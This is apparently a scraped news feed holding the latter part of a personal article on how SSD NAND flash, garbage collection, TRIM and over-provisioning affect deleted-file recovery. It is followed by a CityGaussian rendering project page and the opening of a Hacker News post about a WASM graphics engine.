</p><p>The more bits a multi-level cell has to support affects the cell's performance. With SLC the controller only has to check if one threshold has been exceeded. With MLC the cell can have four values, with TLC eight, and QLC 16. Reading the correct value of the cell requires the SSD controller to use precise voltages and multiple reads to ascertain the charge in the cell. It's also apparent that if a single physical page supports multiple logical pages then that page will be read and written more frequently than a SLC page, with consequent affect on its life expectancy. Furthermore it would seem self-evident that a TLC SSD would need only a third of the physical cells required in an SLC device, so my 120 gb TLC SSD would actually hold only 40 gb of NAND cells. 

</p><p>High-use enterprise SSDs used to be the province of the SLC, with it's greater speed, endurance, reliability and read/write capabilities, MLC and TLC are gaining acceptance for enterprise use. The end-user consumer SSD market gets the cheaper higher capacity but slower and more fragile multiple level cells.

</p><p><b>Why is Nothing One?</b>

</p><p>Anyone still following this may have noticed a common factor in both single and multi-level cells, in that an empty cell - where the floating gate has no charge - represents one. Unlike HDDs, where any bit pattern can be written anywhere, a default logical state of ones is present on an empty SSD page. This is because there is only one programming function on the cells, to move electrons across the floating gate. NAND flash cells can only be programmed to a state of zero, there is no ability to program a one. With multi-level calls the default is still one across all pages, but a logical one can be represented even after the cell has been programmed and there are electrons present across the gate.

</p><p>Ever since Fibonacci introduced the Hindu-Arabic numeral system with its concept of zero into European mathematics in 1202, the human mind associates zero with empty and one with full. To be empty and represent one is rather perplexing, and appears to be mainly from convention (an empty state <i>could</i> represent zero but would required inverters on the data lines). Possibly the circuitry is less complex, and possibly the ability of an empty cell to conduct a charge implies that it is a one.

</p><p><b>They're all SLC anyway:</b>

</p><p>After all this it's perhaps worth emphasising that NAND flash, whatever its intended use, is all physically SLC. If you could look into a TLC cell you wouldn't see 101, or 011, or whatever. There can only ever be one quantity of electrons in a cell, no matter how that quantity is interpreted. The SSD controller knows whether the cells are to be treated as SLC, MLC etc and programs them accordingly, measures the electron count, and determines what logical value it represents. But even quad cells can only contain one value, just as do SLC cells. 

</p><p><b>The Myths and Misconceptions:</b>

</p><p>And now we come to the myths, misconceptions and the real reason for writing this article, what happens when an SSD page is read, written and rewritten, and how does this affect deleted file recovery? On one hand we have NTFS, designed specifically for HDDs way before SSDs became easily available, NAND flash with its own unique way of operating, and several billion humans with years of ingrained HDD use and expectations. And here, if I haven't already, I shall use SSD interchangeably if incorrectly for NAND flash.

</p><p><b>Storage Device Controllers:</b>

</p><p>All HDDs, SSDs and flash drives have an internal controller. It's the way that the storage device can be, in the words of Microsoft, abstracted from the host. That abstraction is done by logical block addressing, where each cluster capable of being addressed on the storage device is known to the host by an ascending number (the LBA). The storage device controller maps that number to the sectors or pages on the device. To the host this mapping is constant - a cluster remains mapped to the same LBA until the host changes it. On an HDD this relationship is physical and fixed: in its simplist deconstruction an HDD controller just reads and writes whatever sectors the host asks it to. It doesn't have to think about what was there before, it just does what it's told and writes new data on top of the old. It does that because it can, there's nothing preventing a new cluster being written directly on top of the same sectors of an old one. On an SSD it's different.

</p><p>With an SSD the host still uses the LBA addressing system with the constant reconciliation between LBA and cluster number. It knows that the device is a SSD and has a few tricks to accommodate this, but they will come later. The SSD controller however has many tricks to reconcile the host's file system, written for HDDs, with the demands of NAND flash.

</p><p><b>Flash Translation Layer:</b>

</p><p>The host still uses LBA addressing to address the SSD for read and writes, as it knows no other. These commands are intercepted by the Flash Translation Layer on the SSD controller. The FTL maintains a map of LBAs to physical block addresses, and and passes the translated PBA to the controller. This map is required because unlike an HDD the LBA to PBA relationship is volatile. It's volatile because of the way data is written to NAND flash.

</p><p>An empty page, with all cells uncharged, contains by default all ones. If a hex editor is used to look at an SSD's empty sectors however, it will be presented with clusters of zeroes. This is because empty pages are not allocated to the LBA/PBA mapping table. Instead, if a read request is issued for an empty page a default page of zeroes is returned. This applies to both unallocated clusters and those which are part of a file: the SSD does not allocate a page and change all its cells from ones to zeroes.

</p><p><b>Floating Gate Transistors:</b>

</p><p>This section might be helpful before plunging into reads and writes, and here cell and (FG)transistor become interchangable (a cell is a transistor). For more, much more, about floating gate MOSFET (Metal-Oxide-Semiconductor Field-Effect Transistors) there is always Wikipedia.

</p><p>A FGMOS transistor has three terminals, gate, drain, and source. When a voltage is applied to the gate a current can flow from the source to the drain. Low voltages applied to the gate cause the voltage flowing from source to drain to vary proportionally to the gate voltage. At a higher voltage the proportional response stops and the gate closes regardless.

</p><p>The charge in the floating gate alters the voltage threshold of the transistor, i.e. at what point the gate will close. When the gate voltage is above a certain value, around 0.5 V, the gate will always close. When the voltage is below this value, the closing of the gate is determined by the floating gate voltage.

</p><p>If the floating gate has no charge then a low voltage applied to the gate closes the gate and allows current to flow from source to drain. If the floating gate has a charge then a higher voltage needs to be applied to the gate for it to close and current to flow. The charge in the floating gate changes how much voltage must be applied to the gate in order for it to close and conduct.

</p><p><b>SSD Reads:</b>

</p><p>There's nothing inherent in the design of NAND flash that prevents reading and writing to and from individual cells. However in line with NAND flash's design goal to be simple and small the standard commands that NAND chips accept are structured such that a page is the smallest addressable unit. This eliminates space that would be needed to hold additional instructions and cell-to-page maps.

</p><p>To read a single page, and the cells within it, the page needs to be isolated from the other pages within the block. To do this the pages not being read are temporarily disabled.

</p><p>All cells/transistors in the same block row (a page) are connected in parallel with a Word Line to the transistors' gates. All transistors in the same block column (cell offset) are chained in series with a Bit Line connecting the drain of one to the source of the next. At the end of each bit line is a sense amplifier. When a read takes place a pass-through voltage is applied to all word lines except the page being read. The pass-through voltage is close to or higher than the highest possible threshold voltage and forces the transistors <i>in all pages not being read</i> to close whether they have a stored charge or not. All bit lines are energised with a low current.

</p><p>The word line for the page being read is given a reference voltage, and all the bit line sense amplifiers read. Transistors holding a high enough electron count will not be closed by the reference voltage, and the bit line current will not pass through the source/drain chain to the sense amplifier. Transistors with no charge, or a charge below the threshold, will be closed by the reference voltage and conduct the bit line current to the sense amplifier. Several reads at varying threshold voltages are required to determine the logical state of a multi-level cell.

</p><p>(To add, or avoid, more confusion a floating gate transistor can be either open or closed. An open gate does not conduct an electrical charge, and a closed gate does. So if the gate is open nothing can get through, and if it's closed it can. No wonder we're confused.)

</p><p>It can be seen from this that to read one page in a block requires that all transistors in every page in the block receive either a pass-through or one or more reference voltages. It also appears that this will still apply even if some or all of the other pages in the block are empty. This becomes significant in Read Disturbance below.

</p><p><b>Interpreting the results:</b>

</p><p>It is quite easy to grasp the concept behind reading an SLC. Only one threshold applies to SLC flash so only one test voltage is required - the floating gate either will or will not close. if the threshold voltage closes the gate then the bit line current passes to the sense amplifier and the stored value is one. If it doesn't then it's zero.

</p><p>Multi-level cells are different, and the reasoning behind the stored value bit order becomes apparent. In a MLC the possible user bit combinations are 11, 10, 00 and 01, separated by three threshold values. To read the most significant (l/h) bit only requires one read, of the middle threshold voltage. If the gate closes then the MSB is one, if it doesn't then the MSB is zero, no matter what is in the least significant bit. To read the LSB (r/h) two reads are required, one of threshold one, and one of threshold three. If the read of threshold one closes the gate then the LSB is set to one and read two is not required. If the gate opens then a read of threshold three is taken. If it closes the LSB is set to zero. If it doesn't then the value is one.

</p><p>The bit combinations in TLC cells are 111, 110, 100, 101, 001, 000, 010, and 011, separated by seven threshold values, and are more tricky to grasp. The MSB bit again only requires one read of the middle threshold, as in MLC. The central bit requires two reads, at threshold two and six, and the LSB requires four reads, at thresholds one, three, five and seven.

</p><p>All multi-cell pages based on the MSB (l/h) are treated as SLC, with only one read required to determine the user bit value.

</p><p><b>SSD Writes:</b>

</p><p>The most significant aspect of NAND flash, the widest fork in the HDD/SSD path, and the fundamental, pivotal factor in what follows, is that data can only be written to an empty SSD page. This is not new, nor is it in any way unknown, but it has the greatest implications for data security and recovery.

</p><p>While SSDs can read and write to individual pages, they cannot overwrite pages, as the voltages required to revert a zero to a one would damage adjacent cells. All writes and rewrites need an empty page. Unlike HDDs, where a compete cluster is written to the disk whatever was there previously, the act of writing an SSD page allocates an empty page with its default of all ones, and an electrical charge is applied to the cells that require changing to zeroes. This is as true for multi-level cells as it is for SLCs, as the no-charge all-ones pattern is either replaced with a charge representing another pattern, or is left alone. This is a once-only process.

</p><p>When a write request is issued an empty page is allocated, usually within the same block, and the data written. The LBA/PBA map in the FTL is updated to allocate the new page to the relevant LBA. The LBA will always remain the same to the host: no matter which page is allocated the host will never know. This is the same process if the user data is being rewritten or if it is a new file allocation: the only difference is that the rewrite will have slightly more work to do. The old page will be flagged as invalid and will be inacessible to the host, but will still take up space within its block as it cannot be reused.

</p><p>Whilst it's easy to grasp writing to SLC pages, multi-level cell pages are more difficult to visualise. The controller accumulates new writes in the SSD cache until enough logical pages to fill a physical page are gathered, and then writes the physical page. This entails the fewest writes to the page. If a logical page in a multi-level page is amended it would require a new page to be allocated and all logical pages rewritten, as the individual values in the physical page can't be altered. If a logical page is deleted then I surmise that the deleted logical page is flagged as invalid, and when the block becomes a candidate for garbage collection any valid logical pages are consolidated before writing. In other words a multi-level page, or at least the majority of them, will always contain a full compliment of logical pages.

</p><p>It's apparent that if NAND flash handles data writes in this way - and it does - the SSD will eventually become full of valid and invalid pages, and performance will gradually slow to a crawl. Although an individual SSD page can't be erased a block can, and this method is used to return blocks to a writable state. To expedite this, and to ensure that a pool of empty blocks is always available for writes, the SSD controller uses Garbage Collection.

</p><p><b>Garbage Collection:</b>

</p><p>Garbage Collection is enabled on the humblest up to the highest capacity SSD: without it NAND flash would be unusable. Garbage Collection is part of the SSD controller and its work is unknown to the host. In its simplest form GC takes a block holding valid and invalid pages, copies the valid pages to a new empty block, updates the LBA mapping tables, and consigns the old block to the invalid block pool. There the block and its pages are reset to empty state, and the block added to the available block pool. Thus a pool of available blocks should always be available for write activity. As long as there is power to the SSD GC will do its work, it cannot be stopped. There are various sophisticated techniques for GC routines, all proprietary and mainly known only to the manufacturers.

</p><p>When an SSD arrives new from the factory writes will gradually fill the drive in a progressive, linear pattern until the addressable storage space has been entirely written. However once garbage collection begins, the method by which the data is written - sequential vs random - affects performance. Sequentially written data writes whole blocks, and when the data is replaced the whole block is marked as invalid. During garbage collection nothing needs to be moved to another block. This is the fastest possible garbage collection - i.e. no garbage to collect. When data is written randomly invalid pages are scattered throughout the SSD. When garbage collection acts on a block containing randomly written data, more data must be moved to a new block before the block can be erased.

</p><p><b>The Garbage Collection Conundrum:</b>

</p><p>Garbage Collection can either take place in the background, when the host is idle, or the foreground, as and when it is needed for a write. Whilst background GC may seem to be preferrable, it has drawbacks. If the host uses a power-saving mode when idle, GC will either wait for the device to restart with a consequent user delay for GC to complete, or wake the device up and reduce battery life whilst the host is 'idle'. Furthermore GC has no knowledge of the data it is collecting. Inevitably some data will be subject to GC and then be deleted shortly afterwards, incurring another bout of GC and consequent additional and unnecessary writes (write amplification, the ratio of actual writes to data writes). Foreground GC, seemingly the antithesis of performance, avoids the power-saving problems, only incurs writes when they are actually required, and with fast cache and highly developed GC algorithms presents no noticeable performance penalty to the user. The trend in modern GC appears to be foreground collection, or a combination of foreground and background collection.

</p><p>Based on foreground garbage collection, and that most user activity is random, then the inevitable conclusion is that the SSD will spend most of its life at full capacity, if by that we mean available blocks, even though the allocated space appears to the host to be low.

</p><p>However there is another potential problem with SSDs, and that is to do with a historical event: the way that file systems were designed.

</p><p><b>File Systems - What you see isn't what you get:</b>

</p><p>Host file systems were designed in the days when HDDs reigned supreme, simply because SSDs had yet to arrive in an available and affordable form. The file system does not take into account the needs of NAND flash. Files are constantly being updated: they get allocated, moved and deleted, and grow and shrink in size. The way the file system handles this is incompatible with the workings of NAND flash.

</p><p>It's worth emphasising that storage devices are abstracted from the host operating system. Whilst an array of folders and files are displayed by Explorer in a form wholly comprehensible to a human, it's all an illusion. What Explorer is showing is a logical construct created entirely from metadata held within the file system's tables. The storage device controller knows nothing about files or folders, or tables or operating systems: all an HDD or SDD sees are commands to read or write specific sectors, which it does faithfully. An SSD has one advantage over an HDD however, it knows that some pages hold data, and are mapped to an LBA, and some pages are empty, hold no valid data, and are not mapped to an LBA. Conversely an HDD does not need to know this, to an HDD all sectors are the same.

</p><p><b>File Deletion:</b>

</p><p>In NTFS, when a file is deleted the entry in the Master File Table is flagged as such, and the cluster bitmap is amended to flag the file's clusters as available for reuse. The delete process takes place entirely within the MFT and the cluster bitmap. This is perfectly adequate for an HDD, as NTFS can simply reuse the MFT entry and the clusters whenever it wishes. On an SSD the process from NTFS's point is exactly the same, as NTFS has no other way of deleting files. However all the SSD sees is exactly what an HDD would see, updates to a few pages. Neither an HDD nor an SSD knows that it's the MFT and cluster bit map being updated, as they have no knowledge of such things. As there is no activity on the deleted file's clusters, the SSD's pages holding the clusters remain mapped to their LBAs in the FTL. The SSD's FTL has no way of knowing that these pages are no longer allocated by NTFS: to the SSD the pages are still valid and will not be cleaned up by garbage collection.

</p><p>As these 'dead' pages are allocated to an LBA they could be released when files are allocated or extended and the host uses that LBA. In this case the page will be flagged as invalid and a new page used. However it is inevitable that eventually a significant amount of unused and unwanted baggage which is not flagged for garbage collection will be pointlessly maintained by the SSD controller and be unavailable for reuse. To overcome this, and to correlate the hosts view of allocated and unallocated pages with the SSD's, NTFS from Windows 7 onwards acquired the TRIM command.

</p><p><b>SSD Detection:</b>

</p><p>Although the storage device is abstracted from the File System, to enable some of the file system's SSD tweaks it needs to know whether the device is an HDD or SSD. There are various ways to do this, including querying the rotational speed of the device, which on an SSD should be zero (or perhaps one). This seems the most widely used and most proficient method.

</p><p><b>TRIM:</b>

</p><p>TRIM (it isn't an acronym) is a SATA command sent by the file system to the SSD controller to indicate that particular pages no longer contain live data, and are therfore candidates for garbage collection. TRIM is only supported in Windows on NTFS volumes. It is invoked on file deletion, partition deletion, and disk formatting. TRIM has to be supported by the SSD and enabled in NTFS to take effect. The command 'fsutil behavior query disabledeletenotify' returns 0 if TRIM is enabled in the operating system. It does not mean that the SSD supports it (or even if an SSD is actually installed) but all modern SSDs support a version of it.

</p><p>There are three different types of TRIM defined in the SATA protocol and implemented in SSD drives. Non-deterministic TRIM: where each read command after a TRIM may return different data; Deterministic TRIM (DRAT): where all read commands after a TRIM return the same data (i.e. become determinate) and do not change until new data is written; and Deterministic Read Zero after TRIM (DZAT): where all read commands after a TRIM return zeroes until the page is written with new data. By the way whilst DRAT returns data on a read it is not the userdata that was ptrviously there bafore the TRIM: it is random.

</p><p>Fortunately Non-Deterministic TRIM is rarely used, and Windows does not support DRAT, so a read of a trimmed page - which is easily done with a hex aditor - invokes DZAT and returns zeroes immediately after the TRIM command is issued. The physical pages may not have been cleaned immediately following the TRIM command, but the SSD controller knows that there is no valid data held at the trimmed page address.

</p><p>TRIM tells the FTL that the pages allocated to specific LBAs are to be classed as invalid. When a block no longer has any free pages, or a specific threshold is reached, the block is a candidate for garbage collection. Live data is copied to a new empty block, and the original block is erased and made available for reuse.

</p><p>TRIM is an asynchronous command that is queued for low-priority operation. It does not need or send a response. The size of the TRIM queue is limited and in times of high activity some TRIM commands may be dropped. There is no indication that this takes place, so some unwanted pages may escape garbage collection.

</p><p><b>RETRIM:</b>

</p><p>Windows Defragger - now called Storage Optimiser - has an option to Optimise SSDs. This does not defrag the SSD but sends a series of TRIM commands to all unallocated pages identified in NTFS's cluster bitmap. This global TRIM (or RETRIM) command is run at a granularity that the TRIM queue will never exceed its permitted size and no RETRIM commands will be dropped. A RETRIM is run automatically once a month by the storage optimiser.

</p><p><b>Over-provisioning:</b>

</p><p>All NAND flash devices use over-provisioning, additional capacity for extra write operations, controller firmware, failed block replacements, and other features utilised by the SSD controller. This capacity is not physically separate from the user capacity but is simply an amount of space in excess of that which can be allocated by the host. The specific pages within this excess space will vary dynamically as the SSD is used. According to Seagate, the minimum reserve is the difference between binary and decimal naming conventions. An SSD is marketed as a storage device and its capacity is measured in gigabytes (1,000,000,000 Bytes). NAND flash however is memory and is measured in gibibytes (1,073,741,824 bytes), making the minimum overprovisioning percentage just over 7.37%. Even if an SSD appears to the host to be full, it will still have 7.37% of available space with which to keep functioning and performing writes (although write performance will be diabolical). Manufacturers may further reduce the amount of capacity available to the user and set it aside as additional over-provisioning, in addition to the built-in 7.37%. Additional over-provisioning can also be created by the host by allocating a partition that does not use the drive's full capacity. The unallocated space will automatically be used by the controller as dynamic over-provisioning.

</p><p>My humble WD SSD has four 32 gb chips but a specified capacity of 120 gb, meaning that it has 8 gb set aside as additional over-provisioning. Add this to the 7.37% minimum (9.4 gb) and the 17.4 gb equates to almost 15% over-provisioning space.

</p><p><b>Wear Levelling:</b>

</p><p>Some files are written once and remain untouched for the rest of their life. Others have few updates, some very many. As a consequence some blocks will hardly ever see the invalid block pool and have a very low erase/write count, and some will be in the pool every few minutes and have a very heavy count. To spread the wear so that all blocks are subject to erase/writes equally, and the performance of the SSD is maintained over its life, wear levelling is used. Wear levelling uses algorithms to indentify blocks with the lowest erase count and move the contents to high erase count blocks; and to select low erase count blocks for new allocations. As with garbage collection, wear levelling is far more complex than I could possibly deduce, let alone explain.

</p><p><b>Read Disturbance:</b>

</p><p>SSD reads are not quite free, there is a price to pay. As described above, a read of one page generates a pass-through voltage on all other cells in the block. This voltage is likely to be below the highest threshold value that could be held by the cell, but it still generates a weak programming effect on the cells, which can unintentionally shift their threshold voltages. The pass-through voltage induces electric tunnelling that can shift the voltages of the unread cells to a higher value, disturbing the cell contents. As the size of flash cells is reduced the transistor oxide becomes thinner and in turn increases this tunnelling effect, with fewer read operations required to neighbouring pages for the unread flash cells to become disturbed, and move into a different logical state. Cells holding lower threshold values are more susceptible to read disturbance.

</p><p>Thus each read can cause the threshold voltages of other unread cells in the same block to shift to a higher value. After a significant amount of reads this can cause read errors for those cells. A read count is kept for each block and if it is exceeded the block is rewritten. The count is high for SLC cells, around 1m, lower for 25 nm MLC at around 40,000, and much lower for 15 nm TLC cells.

</p><p><b>File Recovery:</b>

</p><p>And now we come to deleted file recovery. NTFS goes through exactly the same process to delete a file on an SSD as it does on an HDD, with the exception of the additional TRIM command. And the TRIM command (assuming it's executed) and a few SSD quirks destroys any practicable chance of deleted file recovery.

</p><p>TRIM commands, as described above, have a complimentary setting within the SSD controller in the form of DRAT and DZAT. (I don't believe that non-deterministic TRIM is used in any reputable SSD, and I don't think that Windows supports DRAT, but I have no proof.) The implementation of DZAT means that immediately on successful execution of the TRIM command (which will in most cases be immediately on file deletion) any attempt to read the TRIMed page will return zeroes. The data on the page will still exist until the block is processed by the garbage collector, but that data is not accessible from the host by any practicable means, or any general software.

</p><p>Garbage collection is independent of the host device and will be invoked at the will of the SSD's controller. Once the process is started it cannot be stopped, apart from powering off the SSD. Once powered up again the garbage collector will resume its duties to completion.

</p><p>Deleted file recovery on a modern SSD is next to impossible for the end user, and under Windows as close to impossible as you can get. A theoretical examination of the chips would most likely show compressed and encrypted data, striped over multiple blocks, and no possibility of relating one page of data to another across the multiple millions of pages. There is a very small possibility of recovering recently deleted files by powering off the SSD immediately and sending it to a professional data recovery company. They may recover some data, given enough time and money.

</p><p>After a session of file deletion, such as running Piriform's CCleaner, run Recuva on the SSD. The headers of the deleted files found (and presumably the rest of the file) will all be zeroes. This is TRIM and DZAT doing their work in a few seconds, killing any chance of deleted file recovery. Of course TRIM can be disabled, at the cost of performance, but it's probably better to be a little less cavalier when deleting files that might be wanted later.

</p><p><b>Deletd File Security:</b>

</p><p>The notion of secure file deletion - overwriting a file's data before deletion - is irrelevant, and if any other pattern except zeroes is chosen is just additional and pointless wear on the SSD. Even overwriting with zeroes will cause transaction log and other files to be written, so secure file deletion on an SSD should never be used. Wiping Free Space is far worse for pointless writes, and is even more futile than secure file deletion. The deleted files just aren't there any more.

</p><p><b>The OCZ Myth:</b>

</p><p>Some years ago (as a little light relief to all these acres of text) the OCZ forums were buzzing with the latest method of regaining performance on their SSDs: run Piriform's CCleaner Wipe Free Space, with one overwrite pass of zeroes. Although performance may have been regained, logic, and common sense, went out of the window. The theory was that overwriting the pages with zeroes was equivalent to erasing blocks (this was before the days of TRIM). This was nonsense, and should have been apparent from the start. The default state of an empty page is all ones, not zeroes, and how could a piece of software possibly erase NAND flash?. The real reason was that as CCleaner was filling the pages with zeroes the SSD controller simply unmapped the pages and showed default pages of zeroes to the host. The invalid pages were then candidates for garbage collection, which gave a much greater pool of blocks to call upon on writes, and hence a better performance. A sort of RETRIM before that was invented.

</p><p><b>SSD Defragmentation:</b>

</p><p>One of the SSD mantras is that an SSD should never be defragged. Whilst there is little (there is a little) to be gained from rearranging clusters into adjacent pages - an SSD has no significant overhead in random reads - an SSD defrag is not entirely verboten. In fact from Windows 8 onwards the Storage Optimiser will defrag an SSD if certain conditions are met. If System Restore is enabled, the fragmentation level is above 10%, and at least one month has passed since the last defrag, Windows Storage Optimiser Scheduled Maintenance will defrag the SSD. This is what Microsoft calls a Traditional Defrag, it is not an Optimise (RETRIM). The defrag is required to reduce the extents on the volume snapshot files when system restore is enabled.

</p><p>There is nothing to be afraid of in a monthly defrag. Most users won't hit the 10% fragmented criteria so a simple RETRIM will be run, and Windows 10 users won't get defragged anyway (System Restore is disabled in Widows 10 by default). The reduction in life of an SSD will not be noticed. Furthermore, although SSDs are not fazed by random reads, files do get fragmented and that means a significant increase in I/Os. An occasional clearup is a boon.

</p><p><b>SSD Lifetime:</b>

There are many users worried about the life expectancy of their SSDs. Yes, continuous write/erase cycles, and the added and unseen write amplification, do take a toll on the life of NAND flash. Using an SSD does wear it out. My WD Green 120 gb SSD, a TLC SSD from a reputable manufacturer but at the very lowest cost, has an estimated life of 1 million+ hours and a write limit if 40 terabytes. One million hours is 114 years, so we can forget that. As for writes, at 1 gb a day - far more than my current rate of data use - it would take the same 114 years to reach 40 tb. Even with massive write overhead this SSD is not going to wear out in the forseeable future. If all 128 gib of available flash is used equally, the 40 tb equates to 312 writes per cell, a very conservative number.

</p><p><b>The End:</b>

</p><p>The only thing to add is that NAND flash, SSDs, and especially SSD controllers, are far more sophisticated, complex and incomprehensible than what has been written here, what I know, what I could possibly comprehend, and what I could possibly explain. I should also add secret, as their software is proprietary. Whilst an HDD is a marvel of complex electro-mechanical engineering at a ridiculously low cost, the SSD is an equally marvellous and complex piece of electronics and software at a minimally higher cost. We should be thankful for both.

</p><p>You can return to my home page <a href="http://kcall.co.uk/" target="_top"><i>here</i></a>

</p><p>If you have any questions, comments or criticisms at all then I'd be pleased to hear them: please email me at kes at kcall dot co dot uk.

</p><p><span size="2" color="maroon">© Webmaster. All rights reserved. 

</span></p></div>



</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[CityGaussian: Real-time high-quality large-scale scene rendering with Gaussians (375 pts)]]></title>
            <link>https://dekuliutesla.github.io/citygs/</link>
            <guid>39907876</guid>
            <pubDate>Tue, 02 Apr 2024 16:46:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://dekuliutesla.github.io/citygs/">https://dekuliutesla.github.io/citygs/</a>, See on <a href="https://news.ycombinator.com/item?id=39907876">Hacker News</a></p>
<div id="readability-page-1" class="page">


<div>
          
          <p>
            <span>
              He Guan<sup>1,2</sup>,</span>
            <span>
              Chuanchen Luo<sup>1</sup>,
            </span>
            <span>
              Lue Fan<sup>1,2</sup>,
            </span>
            <span>
              Junran Peng<sup>1</sup>,
            </span>
            <span>
              Zhaoxiang Zhang<sup>1,2,3,4</sup>,
            </span>
          </p>

          <p><span><sup>1</sup>Institute of Automation, Chinese Academy of Sciences</span>
            <span><sup>2</sup>University of Chinese Academy of Sciences (UCAS)</span>
            <span><sup>3</sup>Centre for Artificial Intelligence and Robotics (HKISI, CAS)</span>
            <span><sup>4</sup>State Key Laboratory of Multimodal Artificial Intelligence Systems (MAIS)</span>
          </p>

          
        </div>




<div>
        <h2>Abstract</h2>
        <p>
            The advancement of real-time 3D scene reconstruction and novel view synthesis has been 
            significantly propelled by 3D Gaussian Splatting (3DGS). However, effectively training 
            large-scale 3DGS and rendering it in real-time across various scales remains challenging. 
            This paper introduces CityGaussian (CityGS), which employs a novel divide-and-conquer 
            training approach and Level-of-Detail (LoD) strategy for efficient large-scale 3DGS 
            training and rendering. Specifically, the global scene prior and adaptive training data 
            selection enables efficient training and seamless fusion. Based on fused Gaussian primitives, 
            we generate different detail levels through compression, and realize fast rendering across 
            various scales through the proposed block-wise detail levels selection and aggregation 
            strategy. Extensive experimental results on large-scale scenes demonstrate that our approach 
            attains state-of-the-art rendering quality, enabling consistent real-time rendering of 
            large-scale scenes across vastly different scales.
          </p>
      </div>

<div>
      <h2>Comparison With SOTA</h2>
      <p><img alt="Architecture" src="https://dekuliutesla.github.io/citygs/static/images/table.png" width="100%">
    </p></div>


<div>

      <!-- CityGS: No LoD -->
      <div>
        <h2>CityGS: No LoD</h2>
        <div>
          <p>
              Without our proposed LoD technique, the MatrixCity is depicted by 25 million Gaussians. The consequent speed of 18 FPS (tested on A100) leads to unpleasant roaming experience.
            </p>

        </div>
      </div>
      <!--/ CityGS: No LoD. -->

      <!-- CityGS. -->
      <div>
          <h2>CityGS</h2>
          <p>
            With the support of LoD, our CityGS can be rendered in real-time under vastly different scales. The average speed is 36 FPS (tested on A100).
          </p>
          <!-- <video id="video_10m" autoplay controls muted loop playsinline height="100%">
            <source src="./static/videos/video_10m.mp4"
                    type="video/mp4">
          </video> -->
        </div>
      <!--/ CityGS. -->
      
    </div>

<div>
    <h2>Visual Comparisons</h2>
    
    
  </div>

<div id="BibTeX">
    <h2>BibTeX</h2>
    <pre><code>@misc{liu2024citygaussian,
      title={CityGaussian: Real-time High-quality Large-Scale Scene Rendering with Gaussians}, 
      author={Yang Liu and He Guan and Chuanchen Luo and Lue Fan and Junran Peng and Zhaoxiang Zhang},
      year={2024},
      eprint={2404.01133},
      archivePrefix={arXiv},
      primaryClass={cs.CV}
}</code></pre>
  </div>

<div>
        <h2>References</h2>

        <div>
          <p>
            [Turki 2022] Turki, H., Ramanan, D., Satyanarayanan, M.: Mega-nerf: Scalable construction of large-scale nerfs for virtual fly-throughs. In: Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition. pp. 12922–12931 (2022)
          </p>
          <p>
            [Zhenxing 2022] Zhenxing, M., Xu, D.: Switch-nerf: Learning scene decomposition with mixture of experts for large-scale neural radiance fields. In: The Eleventh International Conference on Learning Representations (2022)
          </p>
          <p>
            [Yuqi 2023] Zhang, Y., Chen, G., Cui, S.: Efficient large-scale scene representation with a hybrid of high-resolution grid and plane features. arXiv preprint arXiv:2303.03003 (2023)
          </p>  
          <p>
            [Bernhard 2023] Kerbl, B., Kopanas, G., Leimkühler, T., Drettakis, G.: 3d gaussian splatting for real-time radiance field rendering. ACM Transactions on Graphics 42(4) (2023)
          </p>
        </div>
      </div>







</div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: 3D + 2D: Testing out my cross-platform WASM graphics engine (337 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=39907845</link>
            <guid>39907845</guid>
            <pubDate>Tue, 02 Apr 2024 16:44:32 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=39907845">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="39907845">
      <td><span></span></td>      <td><center><a id="up_39907845" href="https://news.ycombinator.com/vote?id=39907845&amp;how=up&amp;goto=item%3Fid%3D39907845"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=39907845">3D + 2D: Testing out my cross-platform WASM graphics engine</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_39907845">112 points</span> by <a href="https://news.ycombinator.com/user?id=seanisom">seanisom</a> <span title="2024-04-02T16:44:32"><a href="https://news.ycombinator.com/item?id=39907845">3 hours ago</a></span> <span id="unv_39907845"></span> | <a href="https://news.ycombinator.com/hide?id=39907845&amp;goto=item%3Fid%3D39907845">hide</a> | <a href="https://hn.algolia.com/?query=3D%20%2B%202D%3A%20Testing%20out%20my%20cross-platform%20WASM%20graphics%20engine&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=39907845&amp;auth=f4a205beed782d8a9c166da489fbeb136a787d7c">favorite</a> | <a href="https://news.ycombinator.com/item?id=39907845">34&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>I used to work at Adobe on the infrastructure powering big applications like Photoshop and  Acrobat. One of our worst headaches was making these really powerful codebases work on desktop, web, mobile, and the cloud without having to completely rewrite them.  For example, to get Lightroom and Photoshop working on the web we took a winding path through JavaScript, Google’s PNaCl, asm.js, and finally WebAssembly, all while having to rethink our GPU architecture around these devices. We even had to get single-threaded builds working and rebuild the UI around Web Components. Today the web builds work great, but it was a decade-long journey to get there!</p><p>The graphics stack continues to be one of the biggest bottlenecks in portability. One day I realized that WebAssembly (Wasm) actually held the solution to the madness. It’s runnable anywhere, embeddable into anything, and performant enough for real-time graphics. So I quit my job and dove into the adventure of creating a portable, embeddable WASM-based graphics framework from the ground up: high-level enough for app developers to easily make whatever graphics they want, and low-level enough to take full advantage of the GPU and everything else needed for a high-performance application.</p><p>I call it Renderlet to emphasize the embeddable aspect — you can make self-contained graphics modules that do just what you want, connect them together, and make them run <i>on</i> anything or <i>in</i> anything with trivial interop.</p><p>If you think of how Unity made it easy for devs to build cross-platform games, the idea is to do the same thing for all visual applications.</p><p>Somewhere along the way I got into YC as a solo founder (!) but mostly I’ve been heads-down building this thing for the last 6 months. It’s not <i>quite</i> ready for an open alpha release, but it’s close—close enough that I’m ready to write about it, show it off, and start getting feedback. This is the thing I dreamed of as an application developer, and I want to know what you think!</p><p>When Rive open-sourced their 2D vector engine and made a splash on HN a couple weeks ago (<a href="https://news.ycombinator.com/item?id=39766893">https://news.ycombinator.com/item?id=39766893</a>), I was intrigued. Rive’s renderer is built as a higher-level 2D API similar to SVG, whereas the Wander renderer (the open-source runtime part of Renderlet) exposes a lower-level 3D API over the GPU. Could Renderlet use its GPU backend to run the Rive 